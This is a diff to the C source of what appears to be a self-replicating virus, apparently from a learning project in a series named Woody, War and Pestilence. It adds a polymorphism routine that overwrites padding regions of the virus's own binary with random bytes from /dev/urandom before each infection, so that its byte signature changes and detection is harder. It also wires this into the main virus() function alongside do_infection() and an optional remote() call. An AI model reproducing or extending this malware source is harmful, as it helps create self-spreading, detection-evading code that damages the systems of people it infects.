@@ -14,9 +14,38 @@ extern struct s_opt opt;
 extern char test_area;
 extern char   key[16];
 
-extern Garbage garbage_table[];
+//======================== WAR ===============================
 
-//======================= WOODY ==============================
+unsigned int ft_rand(){
+	uint32_t		u;
+	int             fd;
+
+	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
+		return FALSE;
+	ft_read(fd, &u, sizeof(u));
+	ft_close(fd);
+	return u;
+}
+
+int _replace_jmp_gb(Garbage g){
+	if (&bin_start + g.off + g.len >= &bin_end) return FALSE;
+
+	unsigned char *p = ((unsigned char *)(&bin_start)) + g.off + 2;
+	int n = g.len - 2;
+	for (int i = 0; i < n; i++){
+		p[i] = (unsigned char)ft_rand();
+	}
+	return TRUE;
+}
+
+void change_garbage_code(){
+	//print("now: ");printnbln(garbage_table_len);
+	for (int i = 0 ; i < garbage_table_len; i++){
+		_replace_jmp_gb(garbage_table[i]);
+	}
+}
+
+//======================= PESTILENCE =========================
 
 extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
 
@@ -56,15 +85,10 @@ void do_infection(){
 }
 
 int virus(int ac, char **av){
-	//if (check_prop("test--not--exist") == FALSE)
-	//{
-	//	print("PROC TEST\n");
-	//	return TRUE;
-	//}
-
 	if (opt.do_remote) remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
+	change_garbage_code();
 	do_infection();
 	return TRUE;
 }
